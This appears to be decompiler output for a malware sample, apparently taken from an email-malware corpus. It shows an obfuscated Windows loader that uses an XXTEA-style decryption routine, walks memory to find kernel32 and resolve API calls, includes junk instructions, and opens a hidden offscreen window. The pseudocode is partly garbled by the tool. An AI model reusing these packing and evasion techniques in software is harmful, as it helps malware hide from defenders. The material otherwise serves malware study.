/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0743/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x004011FE
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("pusha");
    asm("emms");
    ecx = A10;
    asm("movd mm2,ecx");
    esi = *A8;
    if(ecx <= 1) {
        if(ecx < -1) {
            goto L0040110e;
        }
    } else {
        ebx = 0;
        asm("movd mm7,ebx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        edi = *(A8 + ecx * 4);
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
        do {
            eax = eax - 1;
            asm("movd mm0,eax");
            asm("movd ebx,mm7");
            ebx = ebx + -1640531527;
            asm("movd mm7,ebx");
            eax = ebx >> 2 & 3;
            asm("movd mm1,eax");
            eax = 0;
            asm("movd mm3,eax");
            edx = A8;
            do {
                esi = *(edx + eax * 4 + 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                eax = (eax ^ esi) + ecx;
                ebx = ebx ^ eax;
                asm("movd eax,mm3");
                edx = A8;
                ebx = ebx + *(edx + eax * 4);
                edi = ebx;
                *(edx + eax * 4) = ebx;
                asm("movd ecx,mm4");
                eax = eax + 1;
                asm("movd mm3,eax");
            } while(eax != ecx);
            esi = *edx;
            ebx = edi >> 5;
            ecx = esi << 2;
            ebx = ebx ^ ecx;
            edx = esi >> 3;
            edx = edx ^ edi << 4;
            ebx = ebx + edx;
            asm("movd edx,mm3");
            asm("movd ecx,mm1");
            edx = edx & 3 ^ ecx;
            eax = Ac;
            ecx = *(eax + edx * 4) ^ edi;
            asm("movd eax,mm7");
            eax = (eax ^ esi) + ecx;
            ebx = ebx ^ eax;
            asm("movd ecx,mm4");
            edx = A8;
            ebx = ebx + *(edx + ecx * 4);
            edi = ebx;
            *(edx + ecx * 4) = ebx;
            asm("movd eax,mm0");
        } while(eax != 0);
        goto L004011fa;
L0040110e:
        asm("movd ecx,mm2");
        ecx = ~ecx;
        asm("movd mm2,ecx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
        ecx = -1640531527;
        asm("mul ecx");
        if(eax != 0) {
            do {
                asm("movd mm7,eax");
                eax = eax >> 2 & 3;
                asm("movd mm1,eax");
                asm("movd ecx,mm4");
                if(ecx <= 0) {
                    goto L004011fa;
                }
                do {
                    asm("movd mm3,ecx");
                    edi = *(A8 + (ecx - 1) * 4);
                    ebx = edi >> 5;
                    ecx = esi << 2;
                    ebx = ebx ^ ecx;
                    edx = esi >> 3;
                    edx = edx ^ edi << 4;
                    ebx = ebx + edx;
                    asm("movd edx,mm3");
                    asm("movd ecx,mm1");
                    edx = edx & 3 ^ ecx;
                    eax = Ac;
                    ecx = *(eax + edx * 4) ^ edi;
                    asm("movd eax,mm7");
                    ebx = ebx ^ (eax ^ esi) + ecx;
                    asm("movd ecx,mm3");
                    edx = A8;
                    eax = *(edx + ecx * 4) - ebx;
                    esi = eax;
                    *(edx + ecx * 4) = eax;
                } while(ecx = ecx - 1);
                asm("movd mm3,ecx");
                asm("movd ecx,mm4");
                edi = *(edx + ecx * 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                ebx = ebx ^ (eax ^ esi) + ecx;
                edx = A8;
                eax = *edx - ebx;
                esi = eax;
                *edx = eax;
                asm("movd eax,mm7");
            } while(eax = eax - -1640531527);
        }
    }
L004011fa:
    asm("popa");
}

/*	Procedure: 0x004011FF - 0x0040126C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011FF()
{



    edi = ax & 4096;
    (save)0x401259;
    (save) *%fs:0x0];
    for(*%fs:0x0] = esp; 1; edi = edi - 4096) {
        *L00403748 = esp;
        eax = 0;
        *L0040374C = ebp;
        *L00403750 = edi;
        if(*edi == 23117) {
            eax = *(edi + 60);
            esi = edi;
            edi = edi + eax;
            if(*edi == 17744) {
                break;
            }
        }
L00401251:
    }
    eax = esi;
    *%fs:0x0] = *esp;
    esp = esp + 8;
    return;
    edi = *L00403750;
    esp = *L00403748;
    ebp = *L0040374C;
    goto L00401251;
}

/*	Procedure: 0x0040126D - 0x00401284
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040126D()
{
	/* unknown */ void  esi;



    eax = 0;
    for(edx = 0; *esi != 0; edx = edx + 1) {
        asm("cmpsb");
        == ? L00401272 : ;
        asm("scasb");
        != ? 0x40127a : ;
        (restore)esi;
    }
    return(edx);
}

/*	Procedure: 0x00401285 - 0x004012E4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401285()
{
	/* unknown */ void  ebp;



    if(*""() == -2) {
        ebx = *L004020F4;
    }
    esi = 0x4020f4;
    (save)0x4020f4;
    ebp = *(ebx + *(ebx + 60) + 120) + ebx;
    edi = *( *(ebp + 32) + ebx) + ebx;
    (restore)edx;
    eax = L0040126D(edx);
    edx = *(ebp + 36) + ebx;
    ecx = *(ebp + 16);
    eax = edx + eax * 2 + 2;
    eax = eax - ecx + ecx;
    eax = *eax & 65535;
    eax = *( *(ebp + 28) + ebx + eax * 4) + ebx;
    (restore)edx;
    *edx = eax;
}

/*	Procedure: 0x004012E5 - 0x00401536
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    goto L00401331;
    asm("adc eax,ecx");
    eax = eax + 1;
    ch = ch + bh;
    asm("adc [eax],eax");
    *(edx + 281479248) = *(edx + 281479248) + ebp;
    *ecx = *ecx - 1;
    ecx = ecx + 1;
    ebx = ebx & *(esi + 1085788672);
L004012fd:
    al = *esi;
    esi = esi + 1;
    *edi = al;
    edi = edi + 1;
    if(!(ebx = ebx + ebx)) {
        ebx = *esi;
        asm("adc ebx,ebx");
    }
    al = *edi;
    if(esi = esi - -4) {
        goto L004012fd;
    }
    eax = 1;
    if(!(ebx = ebx + ebx)) {
        ebx = *esi;
        esi = esi - -4;
        asm("adc ebx,ebx");
    }
    asm("adc eax,eax");
    if(!(ebx = ebx + ebx)) {
        != ? 0x40136a : ;
        ebx = *esi;
        esi = esi - -4;
L00401331:
        (save)"kernel32.dll";
        *__imp__LoadLibraryA();
    }
    *L004020F4 = eax;
    (save)"GetCurrentThread";
    (save) *L004020F4;
    *__imp__GetProcAddress();
    *"" = eax;
    eax = *"";
    L004011FF();
    *L004020F4 = eax;
    *""();
    do {
    } while(eax != -2);
    L00401285();
    (save)2;
    (save)286261265;
    (save)0;
    (save)533197054;
    ecx = 15796141;
    al = al ^ *ebp;
    asm("finit");
    eax = 0;
    asm("loop 0x401397");
    (save)"ExitProcess";
    (save) *L004020F4;
    __imp__ExitProcess = *__imp__GetProcAddress();
    (save)"kernel32.dll";
    *L004020F4 = *__imp__LoadLibraryA();
    (save) *L004020F4;
    L00401000(0x405bb7, 0x407eb8, -2240);
    (restore)eax;
    *L00405BB9 = eax;
    (save)"GetCurrentThread";
    (save) *L004020F4;
    eax = *__imp__GetProcAddress();
    *"" = eax;
    *"1oadLibraryA" = 76;
    goto L00401409;
    asm("adc [eax+0x7e],ch");
L00401409:
    *eax = *eax & al;
    (save) *L004020F4;
    *__imp__GetProcAddress();
    *L004020F8 = eax;
    goto L00401422;
    *(eax + 58) = *(eax + 58) + ch;
L00401422:
    *eax = *eax & al;
    (save) *L004020F4;
    *__imp__GetProcAddress();
    *L004020FC = eax;
    goto L0040143b;
    asm("imul byte [eax+0x66]");
L0040143b:
    *eax = *eax & al;
    *__imp__LoadLibraryA();
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBD = 1;
    }
    goto L00401457;
    edx = 1075847784;
L00401457:
    *(eax - 1) = *(eax - 1) + dl;
    asm("adc eax,0x408152");
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBD = 1;
    }
    *L00403EB6 = eax;
    (save)0;
    eax = *L004020f8();
    *L004020C0 = eax;
    goto L00401486;
    asm("fsubr qword [eax-0x67]");
L00401486:
    *eax = *eax & al;
    *__imp__LoadLibraryA();
    ebx = eax;
    edi = "CreateWindowExA";
    esi = "";
    L00401537();
    (save)32512;
    (save)0;
    *L0040218a();
    *L004020C4 = eax;
    (save)32512;
    (save)0;
    *L0040218e();
    *L004020C8 = eax;
    (save)0x4020b0;
    *L00402192();
    (save)0;
    (save) *L004020C0;
    (save)0;
    (save)0;
    (save)192;
    (save)256;
    (save)-1000;
    (save)-1000;
    (save)4718592;
    (save)"notepad window";
    (save)"notepad class";
    (save)0;
    *""();
    goto L0040150b;
    asm("popa");
L0040150b:
    (save)128;
    (save)-20;
    (save)eax;
    for(*L004021a6(); 1; *L0040219e()) {
        (save)0;
        (save)0;
        (save)0;
        (save)0x4020d8;
        *L00402196();
        (save)0x4020d8;
    }
    goto L0040151a;
}

stack space not deallocated on return
/*	Procedure: 0x00401537 - 0x00401550
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401537()
{



    do {
        *esi = *__imp__GetProcAddress(ebx, edi);
        eax = 0;
        ecx = -1;
        asm("repne scasb");
        esi = esi + 4;
    } while(*edi != 0);
}

/*	Procedure: 0x00401551 - 0x004015AD
 *	Argument size: 16
 *	Local size: 4
 *	Save regs size: 12
 */

L00401551(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    if(Ac != 1) {
        (save)A14;
        (save)A10;
        (save)Ac;
        (save)A8;
        eax = *L004021a2();
    } else {
        ecx = & Vfffffffc;
        *L004020fc(0, 0, 0x401596, 0, 0, ecx);
        eax = 0;
    }
    return;
    al = 172 - bl;
    goto (4202494 - *""());
}

/* address  size  */
/* 0x004012e5       0 */ /* unknown */ void 	__entry_point__;
/* 0x0040807e       0 */ /* unknown */ void 	__imp__CreateWindowExA;
/* 0x00408082       0 */ /* unknown */ void 	__imp__LoadIconA;
/* 0x00408086       0 */ /* unknown */ void 	__imp__LoadCursorA;
/* 0x0040808a       0 */ /* unknown */ void 	__imp__RegisterClassA;
/* 0x0040808e       0 */ /* unknown */ void 	__imp__GetMessageA;
/* 0x00408092       0 */ /* unknown */ void 	__imp__TranslateMessage;
/* 0x00408096       0 */ /* unknown */ void 	__imp__DispatchMessageA;
/* 0x0040809a       0 */ /* unknown */ void 	__imp__DefWindowProcA;
/* 0x0040809e       0 */ /* unknown */ void 	__imp__SetWindowLongA;
/* 0x0040814e       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00408152       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00408156       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
